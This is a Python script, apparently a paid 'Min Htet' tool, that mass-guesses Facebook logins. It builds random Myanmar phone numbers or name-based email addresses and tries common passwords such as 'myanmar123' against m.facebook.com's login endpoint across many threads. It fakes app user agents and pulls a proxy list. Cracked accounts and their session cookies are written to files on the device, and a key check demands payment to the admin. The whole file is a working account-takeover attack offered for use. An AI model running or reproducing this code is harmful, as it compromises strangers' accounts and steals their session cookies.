import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
ugen = []
#Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Kyivstar;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]
#Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/452.0.0.39.110;FBBV/569146793;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/571505881]
for x in range(10000):
	a="Mozilla/5.0 (Linux; Android"
	b=random.choice(["4","5","6","7","8","9","10","11","12","13","14"])
	c="22101316G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"
	d=random.randrange(50,103)
	e="0.0"
	f=random.randrange(1111,9999)
	g=random.randrange(111,999)
	h="Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"
	i=random.randrange(111,444)
	j="0.0"
	k=random.randrange(11,99)
	l=random.randrange(11,99)
	m=";]"
	ugent=(f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}{i}.{j}.{k}.{l}{m}')
	ugen.append(ugent)
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def main():
    os.system('clear')
    print(logo)
    print("\033[38;5;43m\033[1;32m[\033[1;97m1\033[1;32m] \033[1;97mStart Hacking")
    print("\033[38;5;43m\033[1;32m[\033[1;97m0\033[1;32m] \033[1;91mExit Hacking ")
    linex()
    ZWE = input(f'\033[1;32m[\033[1;97m?\033[1;32m] \033[1;97mSELECT \033[1;33m🤑👉\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        single()   
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m770\033[1;32m] / [\033[1;97m442\033[1;32m] / [\033[1;97m669\033[1;32m] / [\033[1;97m880\033[1;32m]")
    linex()
    code = input('\033[1;32m[\033[1;97m?\033[1;32m]\033[1;97m INPUT YOUR CODE \033[1;33m🇲🇲👉\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m] \033[1;97mEXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m3000\033[1;32m] / [\033[1;97m5000\033[1;32m] / [\033[1;97m10000\033[1;32m] / [\033[1;97metc..\033[1;32m] ")
    linex()
    limit=int(input("\033[1;32m[\033[1;32m?\033[1;32m]\033[1;97m INPUT YOUR LIMIT \033[1;33m🔍👉 \033[1;32m "))    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=175) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m\033[38;5;43m[\033[1;91m🇲🇲\033[1;32m]\033[1;97m TOTAL ID        \033[38;5;41m   👉    \033[1;32m'+tl+'                  \033[38;5;43m')
        print(f'\033[1;32m\033[38;5;43m[\033[1;91m⏳\033[1;32m]\033[1;97m CHOICE CODE     \033[38;5;41m   👉    \033[1;32m'+code+'                    \033[38;5;43m')
        print(f"\033[1;32m\033[38;5;43m[\033[1;91m🛫\033[1;32m] \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;31mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!          \033[38;5;43m")
        linex()
        for love in user:
            uid = '+959'+code+love
            pwx = [code+love,love,code+love[:3],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','aungaung','zawzaw','chitchit']
            LEE.submit(rcrack,uid,pwx,tl)

def single():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97mwailin\033[1;32m] / [\033[1;97mkophyo\033[1;32m] / [\033[1;97mzawmyo\033[1;32m] / [\033[1;97mEtc..\033[1;32m]")
                linex()
                first = input('\033[1;32m[\033[1;97m?\033[1;32m]\033[1;97m INPUT SINGLE NAME \033[1;33m❃━━━━➤\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m@gmail.com\033[1;32m] / [\033[1;97m@hotmail.com\033[1;32m] / [\033[1;97mEtc...\033[1;32m] ")
                linex()
                domain = input('\033[1;32m[\033[1;97m?\033[1;32m]\033[1;97m INPUT YOUR DOMAIN \033[1;33m❃━━━━➤\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m] \033[1;97mEXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m3000\033[1;32m] / [\033[1;97m5000\033[1;32m] / [\033[1;97m10000\033[1;32m] / [\033[1;97metc..\033[1;32m] ")
                linex()
                try:
                        limit=int(input("\033[1;32m[\033[1;32m?\033[1;32m]\033[1;97m INPUT YOUR LIMIT \033[1;33m❃━━━━➤ \033[1;32m "))    
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=70) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m\033[38;5;43m[\033[1;91m❃\033[1;32m]\033[1;97m TOTAL ID        \033[38;5;41m   ━━━━━    \033[1;32m'+tl+'                  \033[38;5;43m')
                        print(f'\033[1;32m\033[38;5;43m[\033[1;91m❃\033[1;32m]\033[1;97m CRACK NAME     \033[38;5;41m    ━━━━━    \033[1;32m'+first+'                    \033[38;5;43m')
                        print(f"\033[1;32m\033[38;5;43m[\033[1;91m❃\033[1;32m] \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;31mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!          \033[38;5;43m")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+digitx+domain
                                pwx=[digitx+first,first+digitx,first,first+'123',first+'1234',first+'12345',first+'@123',first+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                                

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\033[1;91m[\033[1;97mMinHtet\033[1;91m]━[\033[1;97m%s\033[1;91m]━[\033[1;97m🤑🤤-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'method':'POST',
            'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
            'scheme':'https',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-asbd-id': '198387',
            'x-fb-lsd': 'AVoPmsopEAk',
            'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32;40m[🤑🤤] {uid} | {ps}" '  \n\033[1;97m[COOKIE] ━━ \033[1;97m'+coki+  '')
                linex()
                open('/sdcard/MinHtet-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[96:111]
                print(f"\033[1;33;40m[👿🤧] {uid} | {ps}")
                open('/sdcard/MinHtet-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
def menu_apikey():
  UMO="MinHtet-"
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "7".join(uuid)
  server = requests.get('https://github.com/LeePelYaMal/Approval/blob/main/MinHtet.txt').text
  os.system("clear")
  os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
  os.system('clear')              
  print ("""\033[1;97m┏\033[1;32m══════════════════\033[1;97m═\033[1;32m══════════════════\033[1;97m┓  
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mEDITOR        \033[1;32m ║ \033[1;97mMin\033[1;32m-\033[1;97mHtet         \033[1;32m║ 
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mTELEGRAM     \033[1;32m  ║ \033[1;97mMin\033[1;32m-\033[1;97mHtet2002     \033[1;32m║
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mSTATUS        \033[1;32m ║ \033[1;97mRND CLONE        \033[1;32m║  
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mTOOL VERSION  \033[1;32m ║ \033[1;93m0.1  \033[1;32m(PAID)      \033[1;32m║
\033[1;97m┗\033[1;32m═\033[1;97m┻\033[1;32m════════════════\033[1;97m┻\033[1;32m══════════════════\033[1;97m┛ """)  
  print(f"\033[1;33mTHIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST")
  print(f"\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
  print(f"\033[1;32m \033[1;32m [\033[1;91m🔒\033[1;32m] Your Key 👉 \033[1;33m"+UMO+id)
  print(f"\033[1;91m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
  print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
  print(f"\033[1;36;1m \033[1;32m [\033[1;91m🔒\033[1;32m] Copy Your Key And Send To Admin  ");time.sleep(0.1)
  print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
  try:
    httpCaht = requests.get("https://github.com/LeePelYaMal/Approval/blob/main/MinHtet.txt").text
    if id in httpCaht:
      print("\033[1;92m \033[1;32m [\033[1;91m🔓\033[1;32m] \033[0;101mYour Key Aproved\033[0m\033[1;32m [\033[1;91m🔓\033[1;32m]  ");time.sleep(2)
      print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      msg = str(os.geteuid())
      time.sleep(0.1)
      pass
    else:
      print(f" \033[1;32m [\033[1;91m💔🔒\033[1;32m] \033[0;101mSorry Bro Your Key Not Aproved\033[0m  ")
      print(f" \033[1;32m [\033[1;91m💵💰\033[1;32m] \033[0;101mSend Wave  To Admin And Get Aproval\033[0m"); time.sleep(2)
      os.system(f'xdg-open https://m.me/Mr.MinHtet404?text='+UMO+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == 'main':
     print(logo)
     menu_apikey()
menu_apikey()
print(' \033[1;32m\033[1;32m [\033[1;91m⏳\033[1;32m]Min Htet Paid Tool Is Log In\033[1;33m....')

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
sys.stdout.write('\x1b[1;35m\x1b]2; MinHtet-VIP \x07')

CorrectUsername = 'Min Htet'
key = 'true'
while key == 'true':
    username = input('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[1;32m  [\033[1;91m⏳\033[1;32m]\033[1;96m🔒👉\033[1;32mEnter Key \033[1;93m: \x1b[1;91m')
    if username == CorrectUsername:
            print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\033[0;97m[•]\033[1;32m Log In Min Htet Paid Tool Successfully') 
            time.sleep(1)
            os.system('clear')
            key = 'false'
            
if __name__ == "__main__":    
     for i in range(5):
        time.sleep(1)

logo= ("""\033[1;97m┏\033[1;32m══════════════════\033[1;97m═\033[1;32m══════════════════\033[1;97m┓  
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mEDITOR        \033[1;32m ║ \033[1;97mMin\033[1;32m-\033[1;97mHtet         \033[1;32m║ 
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mTELEGRAM     \033[1;32m  ║ \033[1;97mMin\033[1;32m-\033[1;97mHtet2002     \033[1;32m║
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mSTATUS        \033[1;32m ║ \033[1;97mRND CLONE        \033[1;32m║  
\033[1;32m║\033[1;97m✔\033[1;32m║ \033[1;97mTOOL VERSION  \033[1;32m ║ \033[1;93m0.1  \033[1;32m(PAID)      \033[1;32m║
\033[1;97m┗\033[1;32m═\033[1;97m┻\033[1;32m════════════════\033[1;97m┻\033[1;32m══════════════════\033[1;97m┛ """) 
def linex():
	print(f' \033[1;97m━\033[1;32m═══════════════════════════════════════════\033[1;97m━')

main()
